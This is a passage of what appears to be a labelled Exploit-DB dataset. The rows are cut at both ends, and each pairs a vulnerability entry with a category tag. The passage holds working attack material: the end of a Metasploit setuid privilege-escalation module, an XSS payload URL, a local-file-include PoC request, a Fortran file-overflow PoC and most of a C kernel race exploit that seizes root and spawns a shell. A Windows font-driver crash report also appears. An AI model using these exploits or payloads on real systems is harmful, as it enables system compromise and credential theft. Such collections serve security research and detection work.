""#{mcsiwrapper_path} is not setuid""       return CheckCode::Safe     end     vprint_good ""#{mcsiwrapper_path} is setuid""      bash_path = cmd_exec 'which bash'     unless bash_path.start_with?('/') && bash_path.include?('bash')       vprint_error 'bash is not installed. Exploitation will fail.'       return CheckCode::Safe     end     vprint_good 'bash is installed'      config_version = cmd_exec ""grep ProdVersion= #{sysinfo_dir}/config/mcsysinfo.cfg""     version = config_version.scan(/^ProdVersion=(\d+-H\d+|\d+-GA)$/).flatten.first     if version.blank?       vprint_error 'Could not determine the SysInfo version'       return CheckCode::Detected     end     if Gem::Version.new(version.sub('-H', '.')) >= Gem::Version.new('10.64')       vprint_error ""SysInfo version #{version} is not vulnerable""       return CheckCode::Safe     end     vprint_good ""SysInfo version #{version} is vulnerable""      CheckCode::Vulnerable   end    def upload(path, data)     print_status ""Writing '#{path}' (#{data.size} bytes) ...""     rm_f path     write_file path, data     register_file_for_cleanup path   end    def mkdir(path)     vprint_status ""Creating '#{path}' directory""     cmd_exec ""mkdir -p #{path}""     register_dir_for_cleanup path   end    def exploit     check_status = check     if check_status != CheckCode::Vulnerable && check_status != CheckCode::Detected       fail_with Failure::NotVulnerable, 'Target is not vulnerable'     end      # Set target     uname = cmd_exec 'uname'     vprint_status ""Operating system is #{uname}""     if target.name.eql? 'Automatic'       case uname       when /SunOS/i         my_target = targets[1]       when /Linux/i         my_target = targets[2]       else         fail_with Failure::NoTarget, 'Unable to automatically select a target'       end     else       my_target = target     end     print_status ""Using target: #{my_target.name}""      # Check payload     if (my_target['Platform'].eql?('linux') && payload_instance.name !~ /linux/i) ||        (my_target['Platform'].eql?('solaris') && payload_instance.name !~ /solaris/i)       fail_with Failure::BadConfig, ""Selected payload '#{payload_instance.name}' is not compatible with target operating system '#{my_target.name}'""     end      # Create a working directory     base_path = ""#{datastore['WritableDir']}/.#{rand_text_alphanumeric rand(5..10)}""     mkdir base_path      # Write config file     config_path = ""#{base_path}/#{rand_text_alphanumeric rand(5..10)}""     upload config_path, ""ExecPath=#{base_path}""      # Upload payload     payload_name = rand_text_alphanumeric rand(5..10)     payload_path = ""#{base_path}/#{payload_name}""     upload payload_path, generate_payload_exe     cmd_exec ""chmod u+sx '#{payload_path}'""      print_status 'Executing payload...'      # Executing .mcsiwrapper directly errors:     #   Command "".mcsiwrapper"" cannot start with `.' or contain `/'.     # Instead, we execute with bash to replace ARGV[0] with the payload file name     output = cmd_exec ""bash -c \""exec -a #{payload_name} #{sysinfo_dir}/bin/.mcsiwrapper --configfile #{config_path}&\""""     output.each_line { |line| vprint_status line.chomp }   end end",Privilege Escalation,1
27452,F5 Firepass 4100 SSL VPN - Cross-Site Scripting source: https://www.securityfocus.com/bid/17175/info  FirePass 4100 SSL VPN is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.   An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.  https://www.example.com/my.support.php3?c=1&s=username</title><img src=http://www.example.com/EXPLOIT.JS>&lang=en&charset=iso-8859-1&uilangchar=en.iso-8859-1,Cross-Site Scripting,1
37916,"Microsoft Windows - 'ATMFD.DLL' Out-of-Bounds Read Due to Malformed FDSelect Offset in the CFF Table Source: https://code.google.com/p/google-security-research/issues/detail?id=392&can=1  We have encountered a number of Windows kernel crashes in the ATMFD.DLL OpenType driver while processing corrupted OTF font files, such as:  --- DRIVER_PAGE_FAULT_IN_FREED_SPECIAL_POOL (d5) Memory was referenced after it was freed. This cannot be protected by try-except. When possible, the guilty driver's name (Unicode string) is printed on the bugcheck screen and saved in KiBugCheckDriver. Arguments: Arg1: ff404e04, memory referenced Arg2: 00000000, value 0 = read operation, 1 = write operation Arg3: 9194bf53, if non-zero, the address which referenced memory. Arg4: 00000000, (reserved)  Debugging Details: ------------------   Could not read faulting driver name  READ_ADDRESS: GetPointerFromAddress: unable to read from 8276e84c Unable to read MiSystemVaType memory at 8274df00  ff404e04   FAULTING_IP:  ATMFD+bf53 9194bf53 8a18            mov     bl,byte ptr [eax]  MM_INTERNAL_CODE:  0  DEFAULT_BUCKET_ID:  VISTA_DRIVER_FAULT  BUGCHECK_STR:  0xD5  PROCESS_NAME:  csrss.exe  CURRENT_IRQL:  0  LAST_CONTROL_TRANSFER:  from 919477af to 9194bf53  STACK_TEXT:   WARNING: Stack unwind information not available. Following frames may be wrong. 9806b938 919477af 099e0403 fbfe2cf0 00000001 ATMFD+0xbf53 9806ba40 91943fe1 00000001 9806ba64 099e04c7 ATMFD+0x77af 9806ba84 916adce2 ff7af010 fbfe2cf0 00000001 ATMFD+0x3fe1 9806bacc 916ade59 ff7af010 fbfe2cf0 00000001 win32k!PDEVOBJ::QueryFontData+0x3e 9806bb40 916ab971 00000002 9806bcf4 00000000 win32k!RFONTOBJ::bInitCache+0xd4 9806bbfc 91727bb0 9806bcdc 9806bca0 00000007 win32k!RFONTOBJ::bRealizeFont+0x5df 9806bca8 91727deb fc17cd80 00000000 00000002 win32k!RFONTOBJ::bInit+0x2e3 9806bcc0 917549a0 9806bcdc 00000000 00000002 win32k!RFONTOBJ::vInit+0x16 9806bcec 91754a59 fbfe2cf0 00000000 0980f8a5 win32k!GreGetFontUnicodeRanges+0x2d 9806bd24 82641896 0d01016e 00000000 0017fcc4 win32k!NtGdiGetFontUnicodeRanges+0x17 9806bd24 779970f4 0d01016e 00000000 0017fcc4 nt!KiSystemServicePostCall 0017fcc4 00000000 00000000 00000000 00000000 0x779970f4 ---  The bugcheck is caused by an attempt to read memory from an unmapped address. Specifically, the function is responsible for parsing the FDSelect region, and the crashing instruction is responsible for checking the version byte (can be either 0 or 3). The reason of the bugcheck is the fact that the kernel doesn't perform any bounds checking against the 32-bit FDSelect offset specified in the Top DICT, key ""12 37"", and instead uses it directly as an index into a user-mode input data buffer. While invalid user-mode memory accesses are gracefully handled by ATMFD, the controlled offset can be set on 32-bit platforms such that it points into kernel space, thus resulting in a reproducible system bugcheck.  To our current knowledge, this condition can only lead to an out-of-bounds read, thus limiting the impact of the bug to remote denial of service, or potentially local kernel memory disclosure. However, we have not fully confirmed that the severity of the bug is not in fact more significant due to some further ATMFD logic we are not aware of.  The issue reproduces on reliably Windows 7 and 8.1. It is easiest to reproduce and possibly exploit on 32-bit versions of Windows, as the ""buffer + 32-bit controlled offset"" expression evaluates to a kernel-mode address, while on 64-bit platforms it remains in the user space area and therefore the exception is gracefully handled by the ATMFD.DLL exception handler.  Attached is an archive with two proof of concept font files together with corresponding kernel crash logs.  Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/37916.zip",Out-of-Bounds Read,1
36795,"Wifi Drive Pro 1.2 iOS - Local File Inclusion Document Title: =============== Wifi Drive Pro v1.2 iOS - File Include Web Vulnerability   References (Source): ==================== http://www.vulnerability-lab.com/get_content.php?id=1447   Release Date: ============= 2015-03-13   Vulnerability Laboratory ID (VL-ID): ==================================== 1447   Common Vulnerability Scoring System: ==================================== 6.3   Product & Service Introduction: =============================== This app lets you use your iphone, iPad or iPod Touch as a wireless USB drive through which you can download, save and view documents and files. Using the app you can transfer files from your PC or Mac either wirelessly or through a USB port and carry your files wherever you go.  (Copy of the Vendor Homepage: https://itunes.apple.com/en/app/wifi-drive-pro/id579582610 )   Abstract Advisory Information: ============================== The Vulnerability Laboratory Core Research Team discovered file include web vulnerability in the official Wifi Drive Pro v1.2 iOS mobile application.   Vulnerability Disclosure Timeline: ================================== 2015-03-13: Public Disclosure (Vulnerability Laboratory)   Discovery Status: ================= Published   Affected Product(s): ==================== Mindspeak Software Product: Wifi Drive Pro - iOS Mobile Web Application 1.2   Exploitation Technique: ======================= Local   Severity Level: =============== High   Technical Details & Description: ================================ A local file include web vulnerability has been discovered in the official Mindspeak Software - Wifi Drive Pro v1.2 iOS mobile web-application. The local file include web vulnerability allows remote attackers to unauthorized include local file/path requests or system specific path commands  to compromise the mobile web-application.  The web vulnerability is located in the `filename` value of the `file upload` module. Remote attackers are able to inject own files with malicious  `filename` values in the `file upload` POST method request to compromise the mobile web-application. The local file/path include execution occcurs in  the index file dir listing of the wifi interface. The attacker is able to inject the local file include request by usage of the `wifi interface`  in connection with the vulnerable file upload POST method request.   Remote attackers are also able to exploit the filename issue in combination with persistent injected script codes to execute different malicious  attack requests. The attack vector is located on the application-side of the wifi service and the request method to inject is POST.   The security risk of the local file include web vulnerability is estimated as high with a cvss (common vulnerability scoring system) count of 6.4.  Exploitation of the local file include web vulnerability requires no user interaction or privileged web-application user account. Successful exploitation  of the local file include web vulnerability results in mobile application compromise or connected device component compromise.  Request Method(s): 				[+] [POST]  Vulnerable Module(s): 				[+] File Upload  Vulnerable Parameter(s): 				[+] filename  Affected Module(s): 				[+] Index File Dir Listing (http://localhost:49276/)   Proof of Concept (PoC): ======================= The local file include web vulnerability can be exploited by local attackers without privileged application user accounts or user interaction. For security demonstration or to reproduce the security vulnerability follow the provided information and steps below to continue.  PoC: GET http://localhost:49276//%3C./[LOCAL FILE INCLUDE VULNERABILITY!]%3E/2.png   PoC: Vulnerable Source <p><a href="".."">..</a><br> <a href=""68-2.png"">68-2.png</a>		(    24.3 Kb, 2015-03-09 14:57:29 +0000)<br> <a href=""/%3C./[LOCAL FILE INCLUDE VULNERABILITY!]%3E/2.png""></%3C./[LOCAL FILE INCLUDE VULNERABILITY!]%3E/2.png</a>	(     0.5 Kb, 2015-03-09 14:57:48 +0000)<br /> </p><form action="""" method=""post"" enctype=""multipart/form-data"" name=""form1"" id=""form1""><label>upload file<input type=""file"" name=""file"" id=""file"" /></label> <label><input type=""submit"" name=""button"" id=""button"" value=""Submit"" /></label></form></body></html></iframe></a></p>   --- PoC Session Logs [POST] (Inject)--- Status: 200[OK] POST http://localhost:49276/  Load Flags[LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] Größe des Inhalts[846] Mime Type[application/x-unknown-content-type]    Request Header:       Host[localhost:49276]       User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0]       Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]       Accept-Language[de,en-US;q=0.7,en;q=0.3]       Accept-Encoding[gzip, deflate]       Referer[http://localhost:49276/]       Connection[keep-alive]    POST-Daten:       POST_DATA[-----------------------------28140821932238 Content-Disposition: form-data; name=""file""; filename=""%3C./[LOCAL FILE INCLUDE VULNERABILITY!]%3E/2.png"" Content-Type: image/png   Reference(s): http://localhost:49276/ http://localhost:49276//%3C./   Solution - Fix & Patch: ======================= The vulnerability can be patched by a secure validation of the filename value in the upload POST method request. Restrict the filename input and  disallow special chars. Ensure that not multiple file extensions are loaded in the filename value to prevent arbitrary file upload attacks. Encode the output in the file dir index list with the vulnerable name value to prevent an application-side injection attacks.   Security Risk: ============== The security risk of the local file include web vulnerability in the upload POST method request is estimated as high. (CVSS 6.3)   Credits & Authors: ================== Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@evolution-sec.com) [www.vulnerability-lab.com]   Disclaimer & Information: ========================= The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed  or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable  in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab  or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for  consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any vendor licenses,  policies, deface websites, hack into databases or trade with fraud/stolen material.  Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com Contact:    admin@vulnerability-lab.com 	- research@vulnerability-lab.com 	       		- admin@evolution-sec.com Section:    magazine.vulnerability-db.com	- vulnerability-lab.com/contact.php		       	- evolution-sec.com/contact Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/  Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to  electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by  Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website  is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact  (admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.  				Copyright © 2015 | Vulnerability Laboratory - [Evolution Security GmbH]™    --  VULNERABILITY LABORATORY - RESEARCH TEAM SERVICE: www.vulnerability-lab.com CONTACT: research@vulnerability-lab.com PGP KEY: http://www.vulnerability-lab.com/keys/admin@vulnerability-lab.com%280x198E9928%29.txt",Local File Inclusion,1
33388,"Xfig and Transfig 3.2.5 - '.fig' Remote Buffer Overflow source: https://www.securityfocus.com/bid/37193/info  Xfig and Transfig are prone to a buffer-overflow vulnerability because they fail to perform adequate boundary checks on user-supplied input.  Attackers may leverage this issue to execute arbitrary code in the context of the application. Failed attacks will cause denial-of-service conditions.  Xfig and Transfig 3.2.5 are vulnerable; other versions may also be affected.          PROGRAM XFIG_POC  CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC C C      XFIG <= 3.2.5B BUFFER OVERFLOW C      TRANSFIG <= 3.2.5A (FIG2DEV SOFT) BUFFER OVERFLOW C      WWW.XFIG.ORG C C      AUTHORS: C      * PEDAMACHEPHEPTOLIONES <pedamachepheptoliones@gmail.com> C      * D.B. COOPER C C      PROBLEM: C      A STACK-BASED BUFFER OVERFLOW OCCURS IN read_1_3_textobject() C      WHEN READING MALFORMED .FIG FILES C      EIP IS OVERWRITTEN SO IT'S NOT JUST A CRASH C C      TEST: C      xfig plane.fig C      fig2dev -L png plane.fig C      (IT DOESN'T HAVE TO BE ""PNG"") C C      SOLUTION: C      DON'T TAKE .FIG CANDY FROM STRANGERS C C      OLDSKOOL FORTRAN POCS FTW C CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC         INTEGER I        CHARACTER(LEN=167) :: STR         DO 10 I=1,167        STR(I:I)='Z' 10     CONTINUE         OPEN(11,FILE='plane.fig')        WRITE(11,*) '0 1 2 3'        WRITE(11,*) '4'        WRITE(11,*) '1 2 3 4 5 6 7 '//STR        CLOSE(11)         WRITE(*,*) 'GREETZ: BACKUS AND BACCHUS'         END PROGRAM XFIG_POC",Remote Buffer Overflow,1
778,"Linux Kernel 2.4 - 'uselib()' Local Privilege Escalation (2) /* *   EDB Note: There's is an updated version ~ https://www.exploit-db.com/exploits/895/ */  /*  * Linux kernel 2.4 uselib() privilege elevation exploit.  *  * original exploit source from http://isec.pl  * reference: http://isec.pl/vulnerabilities/isec-0021-uselib.txt  *  * I modified the Paul Starzetz's exploit, made it more possible  * to race successfully. The exploit still works only on 2.4 series.    * It should be also works on 2.4 SMP, but not easy.   *  * thx newbug.  *  * Tim Hsu <timhsu at chroot.org> Jan 2005.  *  */   #define _GNU_SOURCE  #include <stdio.h> #include <stdlib.h> #include <string.h> #include <fcntl.h> #include <unistd.h> #include <errno.h> #include <sched.h> #include <syscall.h> #include <limits.h>  #include <sys/types.h> #include <sys/wait.h> #include <sys/time.h> #include <sys/mman.h> #include <sys/sysinfo.h>  #include <linux/elf.h> #include <linux/linkage.h>  #include <asm/page.h> #include <asm/ldt.h> #include <asm/segment.h>  #define str(s) #s #define xstr(s) str(s)  #define MREMAP_MAYMOVE  1   //	temp lib location #define LIBNAME 	""/tmp/_elf_lib""  //	shell name #define	SHELL		""/bin/bash""  //	time delta to detect race #define RACEDELTA	5000  //	if you have more deadbabes in memory, change this #define MAGIC		0xdeadbabe   //	do not touch #define	SLAB_THRSH	128 #define	SLAB_PER_CHLD	(INT_MAX - 1) #define LIB_SIZE	( PAGE_SIZE * 4 ) #define STACK_SIZE	( PAGE_SIZE * 4 )  #define LDT_PAGES	( (LDT_ENTRIES*LDT_ENTRY_SIZE+PAGE_SIZE-1)/PAGE_SIZE )  #define ENTRY_GATE	( LDT_ENTRIES-1 ) #define SEL_GATE	( (ENTRY_GATE<<3)|0x07 )  #define ENTRY_LCS	( ENTRY_GATE-2 ) #define SEL_LCS		( (ENTRY_LCS<<3)|0x04 )  #define ENTRY_LDS	( ENTRY_GATE-1 ) #define SEL_LDS		( (ENTRY_LDS<<3)|0x04 )  #define kB		* 1024 #define MB		* 1024 kB #define GB		* 1024 MB  #define TMPLEN		256 #define PGD_SIZE	( PAGE_SIZE*1024 )   extern char **environ;  static char cstack[STACK_SIZE]; static char name[TMPLEN]; static char line[TMPLEN];  static pid_t consume_pid;  static volatile int 	val = 0, 	go = 0, 	finish = 0, 	scnt = 0, 	ccnt=0, 	delta = 0, 	delta_max = RACEDELTA, 	map_flags = PROT_WRITE|PROT_READ;   static int 	fstop=0, 	silent=0, 	pidx, 	pnum=0, 	smp_max=0, 	smp, 	wtime=2, 	cpid, 	uid, 	task_size, 	old_esp, 	lib_addr, 	map_count=0, 	map_base=0, 	map_addr, 	addr_min, 	addr_max, 	vma_start, 	vma_end, 	max_page;   static struct timeval tm1, tm2;  static char *myenv[] = {""TERM=vt100"", 			""HISTFILE=/dev/null"", 			NULL};  static char hellc0de[] = ""\x49\x6e\x74\x65\x6c\x65\x63\x74\x75\x61\x6c\x20\x70\x72\x6f\x70""                          ""\x65\x72\x74\x79\x20\x6f\x66\x20\x49\x68\x61\x51\x75\x65\x52\x00"";   static char *pagemap, *libname=LIBNAME, *shellname=SHELL;    #define __NR_sys_gettimeofday	__NR_gettimeofday #define __NR_sys_sched_yield	__NR_sched_yield #define __NR_sys_madvise	__NR_madvise #define __NR_sys_uselib		__NR_uselib #define __NR_sys_mmap2		__NR_mmap2 #define __NR_sys_munmap		__NR_munmap #define __NR_sys_mprotect	__NR_mprotect #define __NR_sys_mremap		__NR_mremap  inline _syscall6(int, sys_mmap2, int, a, int, b, int, c, int, d, int, e, int, f);  inline _syscall5(int, sys_mremap, int, a, int, b, int, c, int, d, int, e);  inline _syscall3(int, sys_madvise, void*, a, int, b, int, c); inline _syscall3(int, sys_mprotect, int, a, int, b, int, c); inline _syscall3( int, modify_ldt, int, func, void *, ptr, int, bytecount );  inline _syscall2(int, sys_gettimeofday, void*, a, void*, b); inline _syscall2(int, sys_munmap, int, a, int, b);  inline _syscall1(int, sys_uselib, char*, l);  inline _syscall0(void, sys_sched_yield);    int consume_memory() { 	struct sysinfo info; 	char *vmem; 	 	sysinfo(&info); 	vmem = malloc(info.freeram); 	if (vmem == NULL) 	{ 		perror(""malloc""); 		return -1; 	} 	memset(vmem, 0x90, info.freeram);  }   inline int tmdiff(struct timeval *t1, struct timeval *t2) { int r;  	r=t2->tv_sec - t1->tv_sec; 	r*=1000000; 	r+=t2->tv_usec - t1->tv_usec; return r; }   void fatal(const char *message, int critical) { int sig = critical? SIGSTOP : (fstop? SIGSTOP : SIGKILL);  	if(!errno) { 		fprintf(stdout, ""\n[-] FAILED: %s "", message); 	} else { 		fprintf(stdout, ""\n[-] FAILED: %s (%s) "", message, 			(char*) (strerror(errno)) ); 	} 	if(critical) 		printf(""\nCRITICAL, entering endless loop""); 	printf(""\n""); 	fflush(stdout);  	unlink(libname); 	kill(cpid, SIGKILL); 	for(;;) kill(0, sig); }   //	try to race do_brk sleeping on kmalloc, may need modification for SMP int raceme(void* v) { 	finish=1;  	for(;;) { 		errno = 0;  //	check if raced: recheck: 		if(!go) sys_sched_yield(); 		sys_gettimeofday(&tm2, NULL); 		delta = tmdiff(&tm1, &tm2); 		if(!smp_max && delta < (unsigned)delta_max) goto recheck; 		smp = smp_max;  //	check if lib VMAs exist as expected under race condition recheck2: 		val = sys_madvise((void*) lib_addr, PAGE_SIZE, MADV_NORMAL); 		if(val) continue; 		errno = 0; 		val = sys_madvise((void*) (lib_addr+PAGE_SIZE), 				LIB_SIZE-PAGE_SIZE, MADV_NORMAL); 		if( !val || (val<0 && errno!=ENOMEM) ) continue;  //	SMP? 		smp--; 		if(smp>=0) goto recheck2;  //	recheck race 		if(!go) continue; 		finish++;  //	we need to free one vm_area_struct for mmap to work 		val = sys_mprotect(map_addr, PAGE_SIZE, map_flags); 		if(val) fatal(""mprotect"", 0); 		val = sys_mmap2(lib_addr + PAGE_SIZE, PAGE_SIZE*3, PROT_NONE, 			      MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0); 		if(-1==val) fatal(""mmap2 race"", 0); 		printf(""\n[+] race won maps=%d"", map_count); fflush(stdout); 		kill(consume_pid, SIGKILL); 		_exit(0); 	}  return 0; }   int callme_1() { 	return val++; }   inline int valid_ptr(unsigned ptr) { 	return ptr>=task_size && ptr<addr_min-16; }   inline int validate_vma(unsigned *p, unsigned s, unsigned e) { unsigned *t;  	if(valid_ptr(p[0]) && valid_ptr(p[3]) && p[1]==s && p[2]==e) { 		t=(unsigned*)p[3]; 		if( t[0]==p[0] && t[1]<=task_size && t[2]<=task_size ) 			return 1; 	} 	return 0; }   asmlinkage void kernel_code(unsigned *task) { unsigned *addr = task;  //	find & reset uids 	while(addr[0] != uid || addr[1] != uid || 	      addr[2] != uid || addr[3] != uid) 		addr++;  	addr[0] = addr[1] = addr[2] = addr[3] = 0; 	addr[4] = addr[5] = addr[6] = addr[7] = 0;  //	find & correct VMA 	for(addr=(unsigned *)task_size; (unsigned)addr<addr_min-16; addr++) { 		if( validate_vma(addr, vma_start, vma_end) ) { 			addr[1] = task_size - PAGE_SIZE; 			addr[2] = task_size; 			break; 		} 	} }   void kcode(void);  //	CPL0 code mostly stolen from cliph void __kcode(void) { asm( 	""kcode:						\n"" 	""	pusha					\n"" 	""	pushl	%es				\n"" 	""	pushl	%ds				\n"" 	""	movl	$("" xstr(SEL_LDS) "") ,%edx	\n"" 	""	movl	%edx,%es			\n"" 	""	movl	%edx,%ds			\n"" 	""	movl	$0xffffe000,%eax		\n"" 	""	andl	%esp,%eax			\n"" 	""	pushl	%eax				\n"" 	""	call	kernel_code			\n"" 	""	addl	$4, %esp			\n"" 	""	popl	%ds				\n"" 	""	popl	%es				\n"" 	""	popa					\n"" 	""	lret					\n""     ); }   int callme_2() { 	return val + task_size + addr_min; }   void sigfailed(int v) { 	ccnt++; 	fatal(""lcall"", 1); }   //	modify LDT & exec void try_to_exploit(unsigned addr) { volatile int r, *v;  	printf(""\n[!] try to exploit 0x%.8x"", addr); fflush(stdout); 	unlink(libname);  	r = sys_mprotect(addr, PAGE_SIZE, PROT_READ|PROT_WRITE|map_flags); 	if(r) fatal(""mprotect 1"", 1);  //	check if really LDT 	v = (void*) (addr + (ENTRY_GATE*LDT_ENTRY_SIZE % PAGE_SIZE) ); 	signal(SIGSEGV, sigfailed); 	r = *v; 	if(r != MAGIC) { 		printf(""\n[-] FAILED val = 0x%.8x"", r); fflush(stdout); 		fatal(""find LDT"", 1); 	}  //	yeah, setup CPL0 gate 	v[0] = ((unsigned)(SEL_LCS)<<16) | ((unsigned)kcode & 0xffffU); 	v[1] = ((unsigned)kcode & ~0xffffU) | 0xec00U; 	printf(""\n[+] gate modified ( 0x%.8x 0x%.8x )"", v[0], v[1]); fflush(stdout);  //	setup CPL0 segment descriptors (we need the 'accessed' versions ;-) 	v = (void*) (addr + (ENTRY_LCS*LDT_ENTRY_SIZE % PAGE_SIZE) ); 	v[0] = 0x0000ffff; /* kernel 4GB code at 0x00000000 */ 	v[1] = 0x00cf9b00;  	v = (void*) (addr + (ENTRY_LDS*LDT_ENTRY_SIZE % PAGE_SIZE) ); 	v[0] = 0x0000ffff; /* kernel 4GB data at 0x00000000 */ 	v[1] = 0x00cf9300;  //	reprotect to get only one big VMA 	r = sys_mprotect(addr, PAGE_SIZE, PROT_READ|map_flags); 	if(r) fatal(""mprotect 2"", 1);  //	CPL0 transition 	sys_sched_yield(); 	val = callme_1() + callme_2(); 	asm(""lcall $"" xstr(SEL_GATE) "",$0x0""); 	//if( getuid()==0 || (val==31337 && strlen(hellc0de)==31337) ) { 	if (getuid()==0) { 		printf(""\n[+] exploited, uid=0\n\n"" ); fflush(stdout); 	} else { 		printf(""\n[-] uid change failed"" ); fflush(stdout); 		sigfailed(0); 	} 	signal(SIGTERM, SIG_IGN); 	kill(0, SIGTERM); 	setresuid(0, 0, 0); 	execl(shellname, ""sh"", NULL); 	fatal(""execl"", 0); }   void scan_mm_finish(); void scan_mm_start();   //	kernel page table scan code void scan_mm() { 	map_addr -= PAGE_SIZE; 	if(map_addr <= (unsigned)addr_min) 		scan_mm_start();  	scnt=0; 	val = *(int*)map_addr; 	scan_mm_finish(); }   void scan_mm_finish() { retry: 	__asm__(""movl	%0, %%esp"" : :""m""(old_esp) );  	if(scnt) { 		pagemap[pidx] ^= 1; 	} 	else { 		sys_madvise((void*)map_addr, PAGE_SIZE, MADV_DONTNEED); 	} 	pidx--; 	scan_mm(); 	goto retry; }   //	make kernel page maps before and after allocating LDT void scan_mm_start() { static int npg=0; static struct modify_ldt_ldt_s l; //static struct user_desc l; 	pnum++; 	if(pnum==1) { 		pidx = max_page-1; 	} 	else if(pnum==2) { 		memset(&l, 0, sizeof(l)); 		l.entry_number = LDT_ENTRIES-1; 		l.seg_32bit = 1; 		l.base_addr = MAGIC >> 16; 		l.limit = MAGIC & 0xffff; 		l.limit_in_pages = 1; 		if( modify_ldt(1, &l, sizeof(l)) != 0 ) 			fatal(""modify_ldt"", 1); 		pidx = max_page-1; 	} 	else if(pnum==3) { 		npg=0; 		for(pidx=0; pidx<=max_page-1; pidx++) { 			if(pagemap[pidx]) { 				npg++; 			} 			else if(npg == LDT_PAGES) { 				npg=0; 				try_to_exploit(addr_min+(pidx-1)*PAGE_SIZE); 			} else { 				npg=0; 			} 		} 		fatal(""find LDT"", 1); 	}  //	save context & scan page table 	__asm__(""movl	%%esp, %0"" : :""m""(old_esp) ); 	map_addr = addr_max; 	scan_mm(); }   //	return number of available SLAB objects in cache int get_slab_objs(const char *sn) { static int c, d, u = 0, a = 0; FILE *fp=NULL; char x1[20];  	fp = fopen(""/proc/slabinfo"", ""r""); 	if(!fp) 		fatal(""get_slab_objs: fopen"", 0); 	fgets(name, sizeof(name) - 1, fp); 	do { 		c = u = a = -1; 		if (!fgets(line, sizeof(line) - 1, fp)) 			break; 		c = sscanf(line, ""%s %u %u %u %u %u %u"", name, &u, &a, 			   &d, &d, &d, &d); 	} while (strcmp(name, sn)); 	close(fileno(fp)); 	fclose(fp); 	return c == 7 ? a - u : -1; }  long memmaped_size = 0;  //	leave one object in the SLAB inline void prepare_slab() { int *r;  	map_addr -= PAGE_SIZE; 	map_count++; 	map_flags ^= PROT_READ; 		 	r = (void*)sys_mmap2((unsigned)map_addr, PAGE_SIZE, map_flags, 			     MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0); 	if(MAP_FAILED == r) { 		printf(""--> prepare_slab(), %dMb\n"", memmaped_size/1024/1024); 		fatal(""try again"", 0); 	} 	memmaped_size += PAGE_SIZE; 	*r = map_addr; }   //	sig handlers void segvcnt(int v) { 	scnt++; 	scan_mm_finish(); }   //	child reap void reaper(int v) { 	ccnt++; 	waitpid(0, &v, WNOHANG|WUNTRACED); }   //	sometimes I get the VMAs in reversed order... //	so just use anyone of the two but take care about the flags void check_vma_flags();  void vreversed(int v) { 	map_flags = 0; 	check_vma_flags(); }   void check_vma_flags() { 	if(map_flags) { 		__asm__(""movl	%%esp, %0"" : :""m""(old_esp) ); 	} else { 		__asm__(""movl	%0, %%esp"" : :""m""(old_esp) ); 		goto out; 	} 	signal(SIGSEGV, vreversed); 	val = * (unsigned*)(lib_addr + PAGE_SIZE); out: }   //	use elf library and try to sleep on kmalloc void exploitme() { int r, sz, pcnt=0; static char smiley[]=""-\\|/-\\|/"";  //	printf(""\n    cat /proc/%d/maps"", getpid() ); fflush(stdout); //	helper clone 	finish=0; ccnt=0; 	sz = sizeof(cstack) / sizeof(cstack[0]); 	cpid = clone(&raceme, (void*) &cstack[sz-16], 			CLONE_VM|CLONE_SIGHAND|CLONE_FS|SIGCHLD, NULL ); 	if(-1==cpid) fatal(""clone"", 0);  //	synchronize threads 	while(!finish) sys_sched_yield(); 	finish=0; 	if(!silent) { 		printf(""\n""); fflush(stdout); 	}  //	try to hit the kmalloc race 	for(;;) {  		r = get_slab_objs(""vm_area_struct""); 		//printf(""\nfree slab = %d\n"",r); 		while(r != 1 && r > 0) { 			prepare_slab(); 			r--; 		}  		sys_gettimeofday(&tm1, NULL); 		go = 1; 		r=sys_uselib(libname); 		go = 0; 		if(r) fatal(""uselib"", 0); 		if(finish) break;  //	wipe lib VMAs and try again 		r = sys_munmap(lib_addr, LIB_SIZE); 		if(r) fatal(""munmap lib"", 0); 		if(ccnt) goto failed;  		if( !silent && !(pcnt%64) ) { 			printf(""\r    Wait... %c"", smiley[ (pcnt/64)%8 ]); 			fflush(stdout); 		} 		pcnt++; 	}  //	seems we raced, free mem 	r = sys_munmap(map_addr, map_base-map_addr + PAGE_SIZE); 	if(r) fatal(""munmap 1"", 0); 	r = sys_munmap(lib_addr, PAGE_SIZE); 	if(r) fatal(""munmap 2"", 0); 	 //	relax kswapd 	sys_gettimeofday(&tm1, NULL); 	for(;;) { 		sys_sched_yield(); 		sys_gettimeofday(&tm2, NULL); 		delta = tmdiff(&tm1, &tm2); 		if( wtime*1000000U <= (unsigned)delta ) break; 